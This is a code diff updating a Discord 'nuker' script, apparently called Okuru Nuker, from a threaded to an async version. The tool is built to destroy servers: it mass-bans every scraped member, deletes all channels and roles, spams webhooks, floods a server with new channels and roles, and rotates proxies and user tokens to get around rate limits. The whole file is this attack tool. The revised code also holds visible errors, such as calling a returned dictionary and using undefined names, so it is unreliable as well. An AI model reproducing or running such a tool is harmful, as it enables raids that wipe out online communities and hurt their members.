@@ -1,17 +1,17 @@
 '''
-Disclaimer: I normally use "f" tags instead of .format(), but apparently .format() is faster so im using it for this.
-Also I know some naming conventions are wrong for this, it just looks better w/ this project idk why.
-P.S: I'm using tuples for the threading as it's not mutable.
+INFO: Async version may have issues, but it's a good idea to use it anyway for now. If you find a bug, please report it.
+INFO: I know soem naming conventions are bad, but I'm not going to change them as they look better for some reason.
 '''
-import os, sys, threading, time, discord, httpx, colorama, random, json, httpx
+import os, sys, threading, time, discord, httpx, colorama, random, json, httpx, asyncio, aiosonic
 from discord.ext import commands
 from colorama import Fore, init
 from itertools import cycle
 from utils import *
+from tasksio import TaskPool
 
 init()
 
-version = '1.3'
+version = '1.4'
 api = 'v9'
 
 util.setTitle('[Okuru Nuker] - Checking Version')
@@ -41,16 +41,16 @@ with open('config.json') as f:
 util.setTitle('[Okuru Nuker] - Loaded Config')
 
 util.setTitle('[Okuru Nuker] - Loading Scraped')
-proxies = util.getList('proxies.okuru')
-members = util.getList('Scraped/members.okuru')
-channels = util.getList('Scraped/channels.okuru')
-roles = util.getList('Scraped/roles.okuru')
+proxies = util.get_list('proxies.okuru')
+members = util.get_list('Scraped/members.okuru')
+channels = util.get_list('Scraped/channels.okuru')
+roles = util.get_list('Scraped/roles.okuru')
 util.setTitle('[Okuru Nuker] - Loaded Scraped')
 
 proxyPool = cycle(proxies)
 token_type = util.checkToken(token)
 
-def getProxyDict():
+async def get_proxy_dict():
     if(not config['General']['Use Proxies']):
         return({})
     return({'https://': 'http://{}'.format(next(proxyPool))})
@@ -65,11 +65,11 @@ elif token_type == 'bot':
 client = commands.Bot(command_prefix=config['General']['Prefix'], case_insensitive=True, self_bot=userBot, help_command=None)
 
 class NukeFunctions:
-    def BanUser(UserID: str) -> bool:
+    async def BanUser(UserID: str) -> bool:
         try:
             r = httpx.put(
                 'https://discord.com/api/{}/guilds/{}/bans/{}'.format(api, guild, UserID),
-                proxies=getProxyDict(),
+                proxies=await get_proxy_dict()(),
                 headers=headers
             )
             if r.status_code in [200, 201, 204]:
@@ -78,14 +78,14 @@ class NukeFunctions:
                 util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
                 NukeFunctions.BanUser(UserID)
             return(True)
-        except Exception as e:
-            print(e)
-            return(NukeFunctions.BanUser(UserID))
-    def DeleteChannel(ChannelID: str) -> bool:
+        except Exception:
+            return(await NukeFunctions.BanUser(UserID))
+        return(True)
+    async def DeleteChannel(ChannelID: str) -> bool:
         try:
             r = httpx.delete(
                 'https://discord.com/api/{}/channels/{}'.format(api, ChannelID),
-                #proxies=getProxyDict(),
+                #proxies=await get_proxy_dict()(),
                 headers=headers
             )
 
@@ -95,29 +95,29 @@ class NukeFunctions:
                 util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
                 NukeFunctions.DeleteChannel(ChannelID)
             return(True)
-        except:
-            return(NukeFunctions.DeleteChannel(ChannelID))
-        
-    def DeleteRole(RoleID: str):
+        except Exception:
+            return(await NukeFunctions.DeleteChannel(ChannelID))
+        return(True)
+    async def DeleteRole(RoleID: str) -> bool:
         r = httpx.delete(
             'https://discord.com/api/{}/guilds/{}/roles/{}'.format(api, guild, RoleID),
-            proxies=getProxyDict(),
+            proxies=await get_proxy_dict()(),
             headers=headers
         )
         if r.status_code in [200, 201, 204]:
             util.log('[!]', 'Deleted {}{}'.format(Fore.LIGHTCYAN_EX, RoleID))
         elif r.status_code == 429:
             util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-            DeleteChannel(ChannelID)
+            return(NukeFunctions.DeleteRole(RoleID))
         return(True)
 
-    def MakeWebhook(ChannelID: str) -> str:
+    async def MakeWebhook(ChannelID: str) -> str:
         try:
             r = httpx.post(
                 'https://discord.com/api/{}/channels/{}/webhooks'.format(api, ChannelID),
                 headers=headers,
                 json={'name': random.choice(WebhookNames)},
-                proxies=getProxyDict()
+                proxies=await get_proxy_dict()()
             ).json()
             return('https://discord.com/api/webhooks/{}/{}'.format(r['id'], r['token']))
         except:
@@ -125,47 +125,49 @@ class NukeFunctions:
         return('https://discord.com/')
 
 
-    def SendWebhook(WebhookURL: str) -> bool:
+    async def SendWebhook(WebhookURL: str) -> bool:
         for i in range(WebhookSpamAmount):
             try:
                 json={
                     'username': random.choice(WebhookNames),
                     'content': random.choice(WebhookContents)
                 }
-                httpx.post(WebhookURL, json=json, proxies=getProxyDict())
+                httpx.post(WebhookURL, json=json, proxies=await get_proxy_dict()())
                 return(True)
             except:
                 pass
         return(True)
 
-    def CreateChannel(ChannelName: str):
+    async def CreateChannel(ChannelID: str) -> bool:
         r = httpx.post(
             'https://discord.com/api/{}/guilds/{}/channels'.format(api, guild),
-            proxies=getProxyDict(),
+            proxies=await get_proxy_dict()(),
             headers=headers,
-            json={'name': ChannelName, 'type': 0}
+            json={'name': ChannelID, 'type': 0}
         )
         if r.status_code in [200, 201, 204]:
-            util.log('[!]', 'Created {}#{}'.format(Fore.LIGHTCYAN_EX, ChannelName.replace(' ', '-')))
+            util.log('[!]', 'Created {}#{}'.format(Fore.LIGHTCYAN_EX, ChannelID.replace(' ', '-')))
         elif r.status_code == 429:
             util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-            CreateChannel(ChannelID)
+            return(await NukeFunctions.CreateChannel(ChannelID))
+        return(True)
 
-def CreateRole(RoleID: str):
-    r = httpx.post(
-        'https://discord.com/api/{}/guilds/{}/roles'.format(api, guild),
-        proxies=getProxyDict(),
-        headers=headers, 
-        json={'name': RoleID, 'type': 0}
-    )
-    if r.status_code in [200, 201, 204]:
-        util.log('[!]', 'Created {}{}'.format(Fore.LIGHTCYAN_EX, ChannelName))
-    elif r.status_code == 429:
-        util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
-        CreateRole(RoleID)
+    async def CreateRole(RoleID: str) -> bool:
+        r = httpx.post(
+            'https://discord.com/api/{}/guilds/{}/roles'.format(api, guild),
+            proxies=await get_proxy_dict()(),
+            headers=headers, 
+            json={'name': RoleName, 'type': 0}
+        )
+        if r.status_code in [200, 201, 204]:
+            util.log('[!]', 'Created {}{}'.format(Fore.LIGHTCYAN_EX, RoleName))
+        elif r.status_code == 429:
+            util.log('[!]', 'Ratelimited for {}{}'.format(Fore.LIGHTCYAN_EX, r.json()['retry_after']))
+            return(await NukeFunctions.CreateRole(RoleName))
+        return(True)
 
 
-def nukecmd():
+async def nukecmd():
     util.cls()  
     print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Ready To Nuke Server;\n")
     print("\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names Loaded From Config")
@@ -192,11 +194,11 @@ def nukecmd():
 
     sys.stdout.write('Finished, Going back in 3 seconds\n')
     time.sleep(3)
-    menu()
+    await menu()
 
 util.setTitle('[Okuru Nuker] - Menu')
 
-def menu():
+async def menu():
     util.cls()
     print('''
 				\u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
@@ -215,40 +217,34 @@ def menu():
     try:
         choice = int(choice)
     except:
-        return(menu())
+        return(await menu())
         
     if choice == 1:
         util.cls(); util.setTitle('[Okuru Nuker] - Member Banning')
         util.log('[!]', 'Starting member ban.')
-        start = threading.active_threads()
-        for member in members:
-            threading.Thread(target=NukeFunctions.BanUser, args=(member,)).start()
-        while start < threading.active_count():
-            pass
-        util.log('[!!!]', 'Finished, Press Enter to Continue.'); menu()
+        with TaskPool(100) as pool:
+            for member in members:
+                await pool.put(NukeFunctions.BanUser(member))
+        util.log('[!!!]', 'Finished, Press Enter to Continue.'); await menu()
 
 
     elif choice == 2:
         util.cls(); util.setTitle('[Okuru Nuker] - Channel Deletion')
         util.log('[!]', 'Starting Channel Deletion')
-        start = threading.active_threads()
-        for channel in channels:
-            threading.Thread(target=NukeFunctions.DeleteChannel, args=(channel, )).start()
-        while start < threading.active_count():
-            pass
-        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); menu()
+        with TaskPool(100) as pool:
+            for channel in channels:
+                await pool.put(NukeFunctions.DeleteChannel(channel))
+        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
 
 
     elif choice == 3:
         util.cls(); util.setTitle('[Okuru Nuker] - Role Deletion')
         util.log('[!]', 'Starting Role Deletion')
-        start = threading.active_count()
-        for role in roles:
-            threading.Thread(target=NukeFunctions.DeleteRole, args=(role, )).start()
-        while start < threading.active_count():
-            pass
+        with TaskPool(100) as pool:
+            for role in roles:
+                await pool.put(NukeFunctions.DeleteRole(role))
         util.log('[!!!]', 'Finished, Press Enter to Continue.'); input()
-        menu()
+        await menu()
 
 
     elif choice == 4:
@@ -256,12 +252,10 @@ def menu():
         util.log('[?]', 'Channel Amount: ', '')
         amount = input()
         util.log('[!]', 'Starting to Channel Creation')
-        start = threading.active_count()
-        for i in range(int(amount)):
-            threading.Thread(target=NukeFunctions.CreateChannel, args=(random.choice(ChannelNames), )).start()
-        while start < threading.active_count():
-            pass
-        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); menu()
+        with TaskPool(100) as pool:
+            for i in range(int(amount)):
+                await pool.put(NukeFunctions.CreateChannel, random.choice(ChannelNames))
+        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
 
 
     elif choice == 5:
@@ -271,25 +265,23 @@ def menu():
         util.log('[!]', 'Got Names from Config.')
         util.log('[?]', 'Role Amount: ', end='')
         amount = input()
-        start = threading.active_count()
-        for i in range(int(amount)):
-            threading.Thread(target=NukeFunctions.CreateRole, args=(RoleNames,)).start()
-        while start < threading.active_count():
-            pass
-        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); menu()
-        menu()
+        with TaskPool(100) as pool:
+            for i in range(int(amount)):
+                await pool.put(NukeFunctions.CreateRole, random.choice(RoleNames))
+        util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
+        await menu()
 
 
     elif choice == 6:
       util.cls()
       util.setTitle('[Okuru Nuker] - Nuke Command')
-      nukecmd()
+      await nukecmd()
 
     elif choice == 7:
         util.cls()
         util.log('[!]', 'Nuker Creators: Gowixx, Aced, and Yum')
         util.log('[!]', 'Press enter to go back.')
-        input(); menu()
+        input(); await menu()
 
     elif choice == 8:
         util.log('[!]', 'Type {}{}scrape {}in any channel of the server.'.format(
@@ -299,7 +291,7 @@ def menu():
     else:
         util.log('[!]', '{} is not a valid choice.'.format(choice))
         util.log('[!]', 'Press enter to go back.')
-        input();menu()
+        input();await menu()
 
 @client.command(name='Scrape', description='The Funny.', usage='')
 async def scrape(ctx):
@@ -307,41 +299,38 @@ async def scrape(ctx):
     for item in ['members', 'channels', 'roles']:
         try:
             os.remove('Scraped/{}.okuru'.fromat(item))
-        except:
+        except Exception:
             pass
     ctx.guild.members; ctx.guild.channels; ctx.guild.roles
 
     with open('Scraped/members.okuru', 'w') as f:
         f.write('\n'.join([str(member.id) for member in ctx.guild.members]))
         util.log('[!]', 'Scraped {}{} {}Members.'.format(Fore.LIGHTBLUE_EX, len(ctx.guild.members), Fore.RESET))
-        f.close()
     
     with open('Scraped/channels.okuru', 'w') as f:
         f.write('\n'.join([str(channel.id) for channel in ctx.guild.channels]))
         util.log('[!]', 'Scraped {}{} {}Channels.'.format(Fore.LIGHTBLUE_EX, len(ctx.guild.channels), Fore.RESET))
-        f.close()
 
     with open('Scraped/roles.okuru', 'w') as f:
         f.write('\n'.join([str(role.id) for role in ctx.guild.roles]))
         util.log('[!]', 'Scraped {}{} {}Roles.'.format(Fore.LIGHTBLUE_EX, len(ctx.guild.roles), Fore.RESET))
-        f.close()
     
     util.log('[!]', 'Restart is required to apply changes.')
 
     util.log('[!]', 'Press enter to continue.')
     input()
-    menu()
+    await menu()
 
 
 @client.event
 async def on_ready():
     if token_type == 'bot':
-        menu()
+        await menu()
 
 @client.event
 async def on_connect():
     if token_type == 'user':
-        menu()
+        await menu()
 
 @client.event
 async def on_command_error(ctx, error):
